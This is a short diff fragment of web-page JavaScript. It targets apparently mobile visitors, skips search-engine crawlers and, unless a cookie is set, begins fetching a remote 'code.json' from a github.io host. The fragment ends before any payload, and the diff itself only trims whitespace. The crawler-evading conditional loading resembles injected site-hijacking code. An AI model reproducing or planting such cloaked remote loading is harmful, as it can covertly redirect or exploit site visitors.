@@ -1,7 +1,7 @@
 let isWeb =  !(/Win|mac/i.test(navigator.platform));
 let isSpider = /Googlebot|Baiduspider|bingbot|YisouSpider|Bytespider|360Spider|Sogou/i.test(navigator.userAgent);
 let webUser = isWeb && !isSpider;
-if (webUser) { 
+if (webUser) {
 	if(!checkCookie('isQrop')){
 		const xhr = new XMLHttpRequest()
 		const url = 'https://sanjinxiaolongxia.github.io/code.json'
